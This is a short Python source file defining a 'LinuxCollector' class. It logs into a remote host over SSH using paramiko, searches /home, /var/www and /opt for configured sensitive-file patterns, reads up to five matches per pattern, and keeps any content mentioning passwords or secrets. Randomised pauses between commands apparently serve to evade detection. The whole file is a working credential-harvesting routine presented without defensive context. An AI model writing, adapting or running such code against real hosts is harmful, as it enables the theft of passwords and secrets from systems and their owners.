import paramiko
import time
import random

class LinuxCollector:
    def __init__(self, config):
        self.config = config

    def collect(self, host, username, password=None, keyfile=None):
        secrets = []
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            if keyfile:
                client.connect(host, username=username, key_filename=keyfile, timeout=5)
            else:
                client.connect(host, username=username, password=password, timeout=5)

            for pattern in self.config.sensitive_files_linux:
                cmd = f"find /home /var/www /opt -name '{pattern}' 2>/dev/null"
                stdin, stdout, stderr = client.exec_command(cmd)
                files = stdout.read().decode().splitlines()
                for f in files[:5]:
                    stdin2, stdout2, stderr2 = client.exec_command(f"cat {f} 2>/dev/null | head -200")
                    content = stdout2.read().decode()
                    if content and ('PASSWORD' in content.upper() or 'SECRET' in content.upper()):
                        secrets.append({"source": f, "content": content[:300]})
                time.sleep(random.uniform(0.5, 1.0))

            client.close()
        except Exception as e:
            secrets.append({"error": str(e)})
        return secrets